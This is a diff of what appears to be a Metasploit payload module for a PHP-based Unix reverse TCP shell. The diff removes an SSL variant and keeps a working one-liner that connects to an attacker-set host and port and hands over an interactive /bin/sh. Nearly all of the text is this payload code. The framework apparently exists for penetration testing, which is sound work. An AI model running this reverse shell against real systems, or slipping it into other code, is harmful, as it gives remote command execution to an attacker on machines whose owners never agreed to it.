@@ -23,7 +23,7 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'          => 'Unix Command Shell, Reverse TCP (via php)',
 			'Version'       => '$Revision$',
-			'Description'   => 'Creates an interactive shell via php, supports SSL',
+			'Description'   => 'Creates an interactive shell via php',
 			'Author'        => 'RageLtMan',
 			'License'       => BSD_LICENSE,
 			'Platform'      => 'unix',
@@ -55,11 +55,7 @@ module Metasploit3
 		lhost = datastore['LHOST']
 		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		if datastore['SSLHandler']
-			cmd = "php -r '$s=fsockopen(\"ssl://#{datastore['LHOST']}\",#{datastore['LPORT']});while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}'&"
-		else
-			cmd = "php -r '$s=fsockopen(\"#{datastore['LHOST']}\",#{datastore['LPORT']});exec(\"/bin/sh -i <&3 >&3 2>&3\");'&"
-		end
+		cmd = "php -r '$s=fsockopen(\"#{datastore['LHOST']}\",#{datastore['LPORT']});exec(\"/bin/sh -i <&3 >&3 2>&3\");'&"
 	end
 
 end
